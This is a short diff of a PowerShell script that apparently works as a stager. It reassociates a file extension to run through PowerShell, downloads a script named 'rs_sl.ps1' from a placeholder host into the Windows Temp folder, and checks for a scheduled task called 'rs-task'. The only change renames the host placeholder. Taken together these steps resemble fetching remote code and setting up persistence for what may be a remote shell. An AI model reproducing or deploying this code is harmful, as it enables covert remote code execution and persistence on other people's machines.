@@ -4,7 +4,7 @@ C:\Windows\system32\cmd.exe /c assoc $dotext=$extfile
 C:\Windows\system32\cmd.exe /c "ftype $extfile=""C:\Windows\System32\powershell.exe"" ""%1"""
 
 $client = New-Object System.Net.WebClient
-$client.DownloadFile('<SLAVE_HOST_DOMAIN>/rs_sl.ps1', 'C:\\Windows\\Temp\\rs_sl.ps1')
+$client.DownloadFile('<HOST_DOMAIN>/rs_sl.ps1', 'C:\\Windows\\Temp\\rs_sl.ps1')
 
 $taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like "rs-task" }
 if($taskExists) {
